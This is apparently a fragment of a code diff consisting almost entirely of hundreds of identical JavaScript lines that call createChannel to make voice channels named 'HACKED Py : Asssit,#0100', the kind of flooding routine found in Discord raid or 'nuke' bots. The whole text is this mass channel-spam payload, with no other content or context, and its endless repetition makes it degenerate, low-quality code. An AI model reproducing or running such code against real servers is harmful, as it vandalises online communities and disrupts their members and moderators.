+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
